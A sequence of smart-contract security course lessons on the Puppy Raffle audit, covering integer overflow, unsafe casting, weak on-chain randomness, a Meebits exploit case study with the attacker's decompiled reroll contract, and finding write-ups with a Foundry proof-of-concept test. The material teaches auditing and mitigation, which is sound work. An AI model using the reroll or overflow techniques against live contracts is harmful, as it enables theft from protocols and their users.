This line in particular sets my alarm bells off. My experience tells me that this is at risk of `integer overflow`. This is a bit of a classic issue, as newer versions of Solidity (>=0.8.0) are protected from it.

Head back to [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) and let's have a closer look at how this works.

Navigating to `src/arithmetic/OverflowAndUnderflow.sol` we can see a simple example of how this works.

```js
contract Overflow {
    uint8 public count;

    // uint8 has a max value of 255, so if we add 1 to 255, we get 0 if it's unchecked!
    // Versions prior to 0.8 of solidity also have this issue
    function increment(uint8 amount) public {
        unchecked {
            count = count + amount;
        }
    }
}
```

`unchecked` is a keyword in later versions of Solidity, this is being used to tell the compiler not to check for things like overflow. In earlier versions of Solidity (prior to 0.8.0) there were no checks by default.

### Overflow Remix Example

We've provide a [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/arithmetic/OverflowAndUnderflow.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) to experiment with and get a sense of things.

By compiling and deploying our `Overflow.sol` contract, we should be met with this:



The max value of a uint8 is 255. Our `count` variable starts at 0, so let's just pick a number to start with, say 200.



Calling increment updates our `count` variable. No problem so far. Now let's add 60 to our number. `count` should total 260, but what do you think we'll get?



We get 4! This is because our integer is hitting the cap of 255, and then wrapping back to 0.

> **Note:** This true for ints and uints in all versions of Solidity **prior to** 0.8.0.
>
> In Solidity versions 0.8.0+ `unchecked` is required to expose this vulnerability. Uints and ints are `checked` by default. If a max is surpassed in these versions, the transaction will revert.

The situation is the same in circumstances of `underflow`. An integer will wrap to the max value if reduced past it's limit. You can practice this with our remix example as well.

```js
contract Underflow {
    uint8 public count;

    // uint8 has a min value of 0, but if we subtract 1 from 0, we get 255 if it's unchecked!
    // Versions prior to 0.8 of solidity also have this issue
    function decrement() public {
        unchecked {
            count--;
        }
    }
}
```

### Precision Loss

The last vulnerability outlined in this repo is `precision loss`.

```js
contract PrecisionLoss {
    uint256 public moneyToSplitUp = 225;
    uint256 public users = 4;

    // This function will return 56, but we want it to return 56.25
    function shareMoney() public view returns (uint256) {
        return moneyToSplitUp / users;
    }
}
```



At its root, this is because Solidity doesn't support float point numbers. Any time we're performing a division operation, we need to be aware of this potential loss of precision.

### Wrap Up

A Proof of Concept/Code for this vulnerability should be pretty straightforward, so I won't be walking through one, but I challenge you to write one yourself.

If you get stuck - you can check out the [**audit-data**](https://github.com/Cyfrin/4-puppy-raffle-audit/tree/audit-data) branch of the Puppy Raffle Repo for guidance. **_Don't Cheat!_**

Let's keep going!
---
title: Reporting - Templates
---

_Follow along with this video:_

---

### Reporting Templates

Throughout this course we have been, and will continue to use our [**audit-report-templating**](https://github.com/Cyfrin/audit-report-templating) repo to assist us with generating our final findings reports. I wanted to take a moment to make you aware of some alternatives, should you wish to try them out.

### Cyfrin GitHub Report Template

[**audit-repo-cloner**](https://github.com/Cyfrin/audit-repo-cloner)

On the Cyfrin team, we won't write up reports in markdown, we actually report our findings through issues directly on the GitHub repo, this is beneficial for collaborative situations. We use this repo cloner to prepare a repo for an audit by the Cyfrin team. From the README:

```
It will take the following steps:

1. Take the source repository you want to set up for audit
2. Take the target repository name you want to use for the private --repo
3. Add an issue_template to the repo, so issues can be formatted as audit findings, like:

'''
**Description:**
**Impact:**
**Proof of Concept:**
**Recommended Mitigation:**
**[Project]:**
**Cyfrin:**
'''

4. Update labels to label issues based on severity and status
5. Create an audit tag at the given commit hash (full SHA)
6. Create branches for each of the auditors participating
7. Create a branch for the final report
8. Add the report-generator-template to the repo to make it easier to compile the report, and add a button in GitHub actions to re-generate the report on-demand
9. Attempt to set up a GitHub project board
```

### Report Generator Template

[**report-generator-template**](https://github.com/Cyfrin/report-generator-template)

This is a fork of the [**Spearbit Report Generator**](https://github.com/spearbit-audits/report-generator-template) and is used to consolidate issues/projects on a GitHub repo into a PDF Audit report.

From the README:

```
This repository is meant to be a single-step solution to:

- Fetch all issues from a given repository
- Sort them by severity according to their labels
- Generate a single Markdown file with all issues sorted by descending severity
- Integrate that Markdown file into a LaTeX template
- Generate a PDF report with all the issues and other relevant information

```

These tools/templates are especially great when working with a team. They save you from having to manually consolidate markdown write ups. If this is a method you'd like to try in your own auditing process, I encourage you to experiment and determine what works best for you!

For the purposes of this course, we'll continue with the methods we've been using thus far.

Now, we won't _always_ be writing the reports together, but it's imperative that you put in the time to practice. The ability to create high quality reports is necessary for becoming a successful security researcher. Practice, get good at it. Get comfortable with `Proofs of Concept/Code`.

Let's finally get to writing this one together though!
---
title: Weak Randomness - Case Study
---

_Follow along with this video:_

---

### Intro to Meebits and Andy Li

Let's look into a case study that involves the exploit of an NFT project, Meebits, which occurred in 2021. This analysis will shed light on a real-world example of how weak randomness was exploited, resulting in a substantial loss of nearly a million dollars for the protocol.

We extend our appreciation to [**Andy Li**](https://twitter.com/andyfeili) from [**Sigma Prime**](https://sigmaprime.io/) who walks us through the details of this attack.

_Information in this post is graciously provided by Andy_

Remember, periodically conducting post mortems like this greatly contributes towards honing your skills as a security researcher. Familiarity begets mitigation.

### Case Study: Meebits - Insecure Randomness

Meebits, created by Larva Labs (team behind CryptoPunks), was exploited in May 2021 due to insecure randomness in its smart contracts. By rerolling their randomness, an attacker was able to obtain a rare NFT which they sold for $700k.

The concept behind Meebits was simple. If you owned a CryptoPunk, you could mint a free Meebit NFT. The attributes of this newly minted NFT were supposed to be random, with some traits being more valuable than others. However, owing to exploitable randomness, the attacker could reroll their mint until they obtained an NFT with desirable traits.

### How the Attack Happened

There were 4 distinct things that occured.

**Metadata Disclosure:** The Meebit contract contained an IPFS hash which pointed to metadata for the collection. Within the Metadata there existed a string of text that clearly disclosed which traits would be the most rare

    "...While just five of the 20,000 Meebits are of the dissected form, which is the rarest. The kinds include dissected, visitor, skeleton, robot, elephant, pig and human, listed in decreasing order of rarity."

In addition to this, the `tokenURI` function allowed public access to the traits of your minted Meetbit, by passing the function your tokenId.

**Insecure Randomness:** Meebits calculated a random index based on this line of code:

```js
uint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;
```

This method to generate an index is used within Meebit's `randomIndex` function when minting an NFT.

```js
function _mint(address _to, uint createdVia) internal returns (uint) {
        require(_to != address(0), "Cannot mint to 0x0.");
        require(numTokens < TOKEN_LIMIT, "Token limit reached.");
        uint id = randomIndex();

        numTokens = numTokens + 1;
        _addNFToken(_to, id);

        emit Mint(id, _to, createdVia);
        emit Transfer(address(0), _to, id);
        return id;
    }
```

**Attacker Rerolls Mint Repeatedly:** The attacker in this case deployed a contract which did two things.

1. Calls `mint` to mint an NFT
2. Checks the 'random' Id generated and reverts the `mint` call if it isn't desirable.

The attack contract wasn't verified, but if we decompile its bytecode we can see the attack function.

```js
function 0x1f2a8a19(uint256 varg0) public nonPayable {
    require(msg.data.length -4 >= 32);
    require(bool(stor_2_0_19.code.size));
    v0, /*uint256*/ v1 = stor_2_0_19.mintWithPunkOrGlyph(varg0).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE());
    require(RETURNDATASIZE() >= 32);
    assert(bool(uint8(map_1[v1]))==bool(1));
    v2 = address(block.coinbase).call().value(0xde0b6b3a7640000);
    require(bool(v2), 0, RETURNDATASIZE());
}
```

The above my be a little complex, but these are the important lines to note:

```js
v0, /*uint256*/ (v1 = stor_2_0_19.mintWithPunkOrGlyph(varg0).gas(msg.gas));
```

and

```js
assert(bool(uint8(map_1[v1])) == bool(1));
```

The first line is where the mint function is being called by the attacking contract.

The second line is where an assertion is made that the minted NFT has the desired rare traits. If this assersion fails, the whole transaction is reverted.

**Attacker Receives Rare NFT:**

The attacking contract called this mint function and reverted for over 6 hours. Spending ~$20,000/hour in gas until they minted the rare NFT they wanted Meebit #16647. The NFT possessed a Visitor trait and sold for ~$700,000.



### Wrap Up

There you have it. That's how an attacker in 2021 was able to exploit weak randomness in the Meetbits contract.

Thanks again to Andy! In the next lesson we'll be going over how to prevent this madness!
---
title: Introduction
---

_Follow along with this video:_

---

## Puppy Raffle Audit

Welcome to Section 4: Puppy Raffle Audit! In addition to strengthening our skills in manual review, in this section we'll be introducing powerful tools and leveraging `static analysis` to help us secure this protocol.

We'll see the differences between a private audit report and a competitive audit submission and be introduced to the process of competing in a CodeHawks First Flight!

### CodeHawks First Flights

CodeHawks First Flights offer an excellent platform for budding smart contract security researchers. This platform contains relatively easy-to-understand codebases that resemble those you will find in this course.

If you are a beginner, they are a perfect opportunity to get live auditing experience and build upon the things you've learnt in a practical setting. For experienced auditors, they serve as a chance to engage in the community and itterate on your established skills.



We'll be going over how to submit an awesome competitive finding in this section.

### Tooling

As mentioned above, we'll be using new tools to help us in finding vulnerabilities and familiarizing ourselves with `static analysis`. We'll be using:

- [**Slither**](https://github.com/crytic/slither) - A pythonic static analysis tool compatible with Solidity and Vyper
- [**Aderyn**](https://github.com/Cyfrin/aderyn) - Built in Rust by _Alex Roan_, Aderyn traverses Abstract Syntax Trees to highlight suspected vulnerabilities.

Through this section, you will:

- Familiarize yourself with your first set of tooling.
- Understand what static analysis is and its role in enhancing protocol security.
- Gain an insight into the different exploits in this codebase.
- Finally, learn how to write reports of competitive audits and differentiate them from private audits.

### So Many Bugs

Our previous codebase was quite small, Puppy Raffle has more to it and as a result, there are many more bugs to find! There are at least FOUR HIGHs to find in this repo (and likely some I didn't even account for 😋).

### Case Studies

As we uncover vulnerabilities in the Puppy Raffle codebase, we'll dive into real world case studies detailing times these vulnerabilities were exploited in the wild.

This should give you real insight into what's at stake as we're performing security reviews and really instill that these efforts of ours matter.

### Exercises

At the end of the section we'll have _even more_ excercises for you to expand on your knowledge and challenge yourself beyond the course's teachings. These are your opportunities to branch out, network and gain additional experience.

This includes participating in a CodeHawks First Flight or a competitive audit! Get ready!

### Prep for Puppy Raffle

If you take a look at the [**repo**](https://github.com/Cyfrin/4-puppy-raffle-audit) associated with this section, you'll see a fairly robust README already supplied. For this review, we're assuming the protocol has already undergone some degreee of onboarding and they've provided us a respectable repo.

I will transparently point out that, much like our previous protocol review, this repo has multiple branches, one of which is the `audit-data` branch. I **STRONGLY** encourage you to resist peeking in this branch until the end. The `audit-data` branch effectively serves as an `answer key`, in which all the vulnerabilities and write-ups can be found.

Going through the codebase throughout the course, and appreciating each step is how you're going to build these skills. Uncovering the attack vectors is how you build familiarity with these risks. Skipping over steps is only going to harm your progress. Build the habits, do the work.
---
title: What is a Competitive Audit?
---

_Follow along with this video:_

---

### Competitive vs Private Audits

Before we get to our report, I want to illustrate what a competitive audit is, and how it may differ from a private audit.

**_What is a competitive audit?_**

Unlike a private audit, where a single security researcher (or a small team) would be working with a protocol directly, a competitive audit sees a protocol making their code base publicly available and having people compete to find vulnerabilities within it.

I encourage you to checkout some of the past competitive audits on [**CodeHawks**](https://www.codehawks.com/contests), you can click 'View Final Report' To see a compilation of all the findings in a contest, who found it etc.

In a competitive audit, you're competing to find _bugs_, you're paid if you find vulnerabilities.

We can see how these payouts work by looking at the [**CodeHawks Docs**](https://docs.codehawks.com/). Findings rewards are ultimately broken down into shares and severity, where the system rewards finding more unique, difficult to find bugs.



You can also find examples of scenarios and calculations on the [**CodeHawks Docs**](https://docs.codehawks.com/hawks-auditors/payouts).

**_How good are competitive audits?_**

The quality of competitive audits has been found to be - incredible. To use a past contest on CodeHawks as an example, the Beedle-Fi audit resulted in a staggering number of findings.



Security reviews of this nature consistently find more bugs that private reviews _and_ they serve as the perfect platforms to gain experience and build your security researcher career.

Many top security researchers started their careers in this space, and continue to compete in competitive audits throughout.

Competitive audits are a tonne of fun, you can learn lots and of course you can win money.

**_How do I start with competitive audits?_**

I'm glad you asked! CodeHawks hosts events called [**First Flights**](https://www.codehawks.com/first-flights), and we're going to have you do some of these!

First Flights are simplified code bases (just like Puppy Raffle) that have been built specifically to ease newcomers into the auditing process, familiarize them with how competitive audits work and afford auditors an effective avenue through which to learn and grow their skills with real world experience.

One additional benefit to using competitive audits as a platform to improve your skills is, once one concludes, all the validated findings are viewable, allowing an auditor to see which vulnerabilities they missed and how others are reporting their findings. This is hugely valuable for those looking to expand their skills.

In the next lesson we'll sign up for CodeHawks together!
---
title: Pit Stop
---

_Follow along with this video:_

---

### Pitstop

At this point we're nearly done. We've two outstanding things to cover.

The first will be running through the `Slither` and `Aderyn` reports for Puppy Raffle and finally we'll check the code quality/tests for this repo.

Once we've completed those steps, I'm going to walk you through `Competitive Audits` on CodeHawks and how to submit a finding!

Then, the very last thing we'll do in this section is write our Puppy Raffle report, with PoCs. We won't always be going through the entire reporting process together. It can be time intensive, but it's important for you to practice these skills on your own. This is your opportunity to test yourself, gain insights, and prepare for future competitive audits.

You can find the Puppy Raffle final report in markdown within the [**audit-data branch**](https://github.com/Cyfrin/4-puppy-raffle-audit/tree/audit-data/audit-data) of the repo, along with a PDF version. You will also find the output of our `Aderyn` and `Slither` reports there, in case you want to compare yours and ensure its correctness.

That's it! By the end you'll have another professional audit report to add to your security review portfolio.

In the next lesson, we start with Slither!
---
title: Recon - Reading Docs
---

_Follow along with this video:_

---

### Context from Documentation

Ok, we've scoped things out. Let's start with step 1 of `The Tincho` - Reading the documentation.

What we've been provided is a little sparse - but read through the README of [**Puppy Raffle**](https://github.com/Cyfrin/4-puppy-raffle-audit).


About Puppy Raffle





# Puppy Raffle

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.



---

Above we see a pretty clear description of the protocol and it's intended functionality. What I like to do is open a `notes.md` file in my project and summarize things in my own words.

```
## About

> The project allows users to enter a raffle to win a dog NFT.
```

Use this notes file to record your thoughts as you go, it'll make summarizing things for our report much easier later.

Let's take a look at some of the code that powers the expected functionality in the next lesson.
---
title: Recon Continued
---

_Follow along with this video:_

---

Let's continue with our manual review of PuppyRaffle. So far we've gone through

- enterRaffle - where we uncovered a DoS vulnerability
- refund - we discovered is vulnerable to reentrancy
- getActivePlayerIndex - we found an edge case where players at index 0 aren't sure if they've entered the raffle!

Walking through the code, we're moving onto the `selectWinner` function. This is a big one, we'll have a lot to go over.

```js
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);

    uint256 tokenId = totalSupply();

    // We use a different RNG calculate from the winnerIndex to determine rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }

    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
}
```

The function's NatSpec makes it's purpose quite clear.

```js
/// @notice this function will select a winner and mint a puppy
/// @notice there must be at least 4 players, and the duration has occurred
/// @notice the previous winner is stored in the previousWinner variable
/// @dev we use a hash of on-chain data to generate the random numbers
/// @dev we reset the active players array after the winner is selected
/// @dev we send 80% of the funds to the winner, the other 20% goes to the feeAddress
```

We can see the first thing this function is doing is performing some checks. Given what we recently learnt a reasonable question to ask might be _Is this following CEI?_

Well, in this instance the only thing happening after our external call is `_safeMint`. We're not really sure what this is yet, so we may come back to it.

```js
  (bool success,) = winner.call{value: prizePool}("");
  require(success, "PuppyRaffle: Failed to send prize pool to winner");
  _safeMint(winner, tokenId);
```

One of our checks requires the `raffleDuration` to have passed, verifying this variable is set properly would be another thing we would want to check. In this case the `raffleDuration` is set in our constructor, the `raffleStartTime` is set during the instant of deployment. Looks good.

```js
require(block.timestamp >=
  raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

I encourage you to write these thoughts down in your `notes.md` file and actually write in-line notes to keep them organized. Being able to reference these thoughts during our write ups and later in the review is incredibly valuable to the proceess.

```js
// @Audit: Does this follow CEI?
// @Audit: Are the duration and time being set correctly?
// @Audit: What is _safeMint doing after our external call?
```

It's important to note the `selectWinner` function is external, so anyone can call it. The checks in this function will be really important, but they do look good.

Moving on, the next this thing function is doing is defining a `winnerIndex`.

```js
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
address winner = players[winnerIndex];
```

It seems our function is using a pseudo-random number, modded by the player's array to choose our winning index. It then assigns the player at that index in the array to our `winner` variable.

This winner variable is used further in the function to distribute the `prizePool` as well as mint the winning NFT.

```js
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```

It's important that this selection is fair and truly random or this could be exploited by malicious actors fairly easily. My alarm bells are going off and I'm seeing a lot of red flags.

### Wrap Up

Having gone through the `selectWinner` function, we now have a better understanding of this process and how it's controlleed.

The function can't be called until the `raffleDuration` has passed and there are at least 4 people entered. Once `selectWinner` is called and passes checks, it uses a pseudo-random method to determine a winner of the raffle and then transfers the `prizePool` and mints them an NFT.

The question becomes:

```js
// @Audit: Is this selection process fair/truly random?
```

Let's look more closely in the next lesson!

> **Challenge:** There is a **massive** bug with refund + selectWinner that we _don't_ go over here. I challenge you to find it!
---
title: Reporting - Integer Overflow
---

_Follow along with this video:_

---

### Integer Overflow and Unsafe Casting

Lets start with the integer overflow we identified in the `selectWinner` function. We thoroughly went through this vulnerability in previous lessons!

```js
totalFees = totalFees + uint64(fee);
```

We should begin by determining severity.

- **Impact:** High - Fees are at risk of being lost/stuck. This typically is going to result in a high impact.
- **Likelihood:** High - It could be argued that this is a `medium`, but the risk increases with how successful the protocol becomes, and we want Puppy Raffle to be successful. High.

With the above determined, let's start filling out our finding template. I know this seems repetitive, but this is what's going to make you _really good_ at writing these reports.

```
### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees
```

For the description section, lets include some of the work we did in `chisel` to show this happening.

````
### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows.

    ```js
    uint64 myVar = type(uint64).max
    // 18446744073709551615
    myVar = myVar + 1
    // myVar will be 0
    ```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract
````

Now, we didn't write a Proof of Concept together for this, but I _have_ prepared one. This is another moment I'm going to challenge you to write one yourself before continuing. You need to practice these skills to improve them.

Once you've made an attempt, compare what you've done with the PoC I've provided below to see how you did!


Integer Overflow PoC

1. We conclude a raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle
3. 3. `totalFees` will be:

```js
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```

4. You will not be able to withdraw due to the line in `PuppyRaffle::withdrawFees`:

```js
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.


Code

```js
function testTotalFeesOverflow() public playersEntered {
    // We finish a raffle of 4 to collect some fees
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    uint256 startingTotalFees = puppyRaffle.totalFees();
    // startingTotalFees = 800000000000000000

    // We then have 89 players enter a new raffle
    uint256 playersNum = 89;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    // We end the raffle
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // And here is where the issue occurs
    // We will now have fewer fees even though we just finished a second raffle
    puppyRaffle.selectWinner();

    uint256 endingTotalFees = puppyRaffle.totalFees();
    console.log("ending total fees", endingTotalFees);
    assert(endingTotalFees < startingTotalFees);

    // We are also unable to withdraw any fees because of the require check
    vm.prank(puppyRaffle.feeAddress());
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```





---

I trust you attempted the PoC yourself - time to add our recommended mitigation

````
**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.
    ```diff
    - pragma solidity ^0.7.6;
    + pragma solidity ^0.8.18;
    ```
Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

1. Use a `uint256` instead of a `uint64` for `totalFees`.
    ```diff
    - uint64 public totalFees = 0;
    + uint256 public totalFees = 0;
    ```
2. Remove the balance check in `PuppyRaffle::withdrawFees`
    ```diff
    - require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ```
We additionally want to bring your attention to another attack vector as a result of this line in a future finding.
````

There's another finding we identified which is going to have a write up that is very similar to this one - unsafe casting. I'm going to challenge you to write this one yourself (as its a little repetitive and uninteresting after what we just did), but it's good practice. Compare your write up versus mine below.


Unsafe Casting Write Up
    
    ### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

    **Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

    ```javascript
        function selectWinner() external {
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
            require(players.length > 0, "PuppyRaffle: No players in raffle");

            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 fee = totalFees / 10;
            uint256 winnings = address(this).balance - fee;
    @>      totalFees = totalFees + uint64(fee);
            players = new address[](0);
            emit RaffleWinner(winner, winnings);
        }
    ```

    The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

    **Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

    **Proof of Concept:**

    1. A raffle proceeds with a little more than 18 ETH worth of fees collected
    2. The line that casts the `fee` as a `uint64` hits
    3. `totalFees` is incorrectly updated with a lower amount

    You can replicate this in foundry's chisel by running the following:

    ```javascript
    uint256 max = type(uint64).max
    uint256 fee = max + 1
    uint64(fee)
    // prints 0
    ```

    **Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

    ```javascript
    // We do some storage packing to save gas
    ```
    But the potential gas saved isn't worth it if we have to recast and this bug exists.

    ```diff
    -   uint64 public totalFees = 0;
    +   uint256 public totalFees = 0;
    .
    .
    .
        function selectWinner() external {
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
            require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
            uint256 winnerIndex =
                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 totalAmountCollected = players.length * entranceFee;
            uint256 prizePool = (totalAmountCollected * 80) / 100;
            uint256 fee = (totalAmountCollected * 20) / 100;
    -       totalFees = totalFees + uint64(fee);
    +       totalFees = totalFees + fee;
    ```
---
title: Exploit - Weak Randomness
---

_Follow along with this video:_

---

### Weak Randomness Overview

This will be a quick overview, but there are a view ways that Weak Randomness can cause issues.

Let's actually take a moment to go back to `Slither` because, if you can believe it, `Slither` will actually catch this for us.

```bash
slither .
```

Running slither as above we can see it's output contains the following:



So what is this detector telling us - that `PuppyRaffle.sol` is using weak PRNG or Pseudo Random Number Generation. We can navigate to the [**link provided**](https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG) for more information and a simplified example of this vulnerability.



Beyond what's outlined here as a concern - that miners can influence global variables favorable - there's a lot more _weirdness_ that goes into random numbers on-chain.

If you've seen any of my other content, you know that Chainlink VRF is a solution for this problem, and I encourage you to check out the [**documentation**](https://docs.chain.link/vrf) for some additional learnings.

### Remix Examples

Return to our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo and we've included a link to a [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) of this vulnerability.

> This contract is available for local testing as well [**here**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol).

Looking at the `Remix` example, we can see it's doing something very similar to what `PuppyRaffle` is doing

```js
uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)));
```

In this declaration we're taking 3 variables:

- msg.sender
- block.prevrandao
- block.timestamp

We're hashing these variables and casting the result as a uint256. The problem exists in that the 3 variables we're deriving our number from are able to be influenced or anticipated such that we can predict what the random number will be.

The test set up in [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) may look a little silly, but what's trying to be conveyed is that generating the same random number in a single block is another example of how this vulnerability can be exploited.

```js
// For this test, a user could just deploy a contract that guesses the random number...
// by calling the random number in the same block!!
function test_guessRandomNumber() public {
    uint256 randomNumber = weakRandomness.getRandomNumber();

    assertEq(randomNumber, weakRandomness.getRandomNumber());
}
```

### Wrap Up

In short - the blockchain is deterministic. Using on-chain variables and pseudo random number generation leaves a protocol open to exploits whereby an attacker can predict or manipulate the 'random' value.

There multiple ways that weak randomness can be exploited, and we'll be going through them in the next lesson!
---
title: Reporting - Magic Numbers
---

_Follow along with this video:_

---

### Reporting Magic Numbers

Next up, we see the `selectWinner` function come up again with our `@Audit` tag. This time, it's pointing to `magic numbers`. Definitely an `informational` we should write up.

```js
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```

We see the problem here. When reading through a code base, number literals can make things difficult to understand.

Lets add this to our `findings.md` report.

````
### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.

Examples:
    ```js
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;

    uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
    uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
    ```
````

We could probably be a little more verbose, but for the purposes of an `informational` in a private audit setting, this is sufficient. Mark it as complete and let's move on.
---
title: Reporting - getActivePlayerIndex Incorrect For Edge Case
---

_Follow along with this video:_

---

### getActivePlayerIndex Incorrect for Edge Case

Next finding we marked down was regarding `getActivePlayerIndex`. The issue we outlined here was, if a player exists at index 0, they may erroneously believe they are not entered into the raffle.

Let's begin the write up with a title. There's some argument to be had that a vulnerability of this nature would be `Medium Severity`. If we consider however, that the impact is really only affecting a single user, `Low` could be appropriate as well, noting that the likelihood is a bit of a toss up - is it high, because it certainly happens if player[0] calls this function, or is it low because _only_ player[0] can call this function?

Ultimately we're going to record this as a low. My title is going to look like so:

```
[L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existant players and players at index 0 causing players to incorrectly think they have not entered the raffle
```

Root Cause. Impact. Classic. 😆

NEXT, DESCRIPTION! Define where the bug is and how it's encountered/exploited.

````
**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec it will also return zero if the player is NOT in the array.


    ```js
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
    ```
````

Impact. Let's spell out the practical effect of this bug

```
**Impact:** A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.
```

A Proof of Code/Concept is something we should always strive to include in our reports. For `Low Severity` issues however, it may not be necessary to extraneously include test cases et al for what are otherwise simple to describe issues.

For this report, I'm just going to outline the steps that lead to encountering the vulnerability.

```
**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation
```

As for mitigations, there are a few things that could solve this issue for the protocol. There's no reason to limit ourselves to just one.

```
**Recommendations:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.
```

Done!

### Wrap Up

We're getting really quick at these write ups now. You can see that the severity of an issue uncovered often pertains to the complexity of it's write up.

We've a few more reports to complete, lets keep going.
---
title: Reporting - Zero Address Check
---

_Follow along with this video:_

---

### Zero Address Check

We're flying through these! Next note that comes up when we search our `@Audit` tag is ...

```js
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) EERC721 ("Puppy Raffle, "PR""){
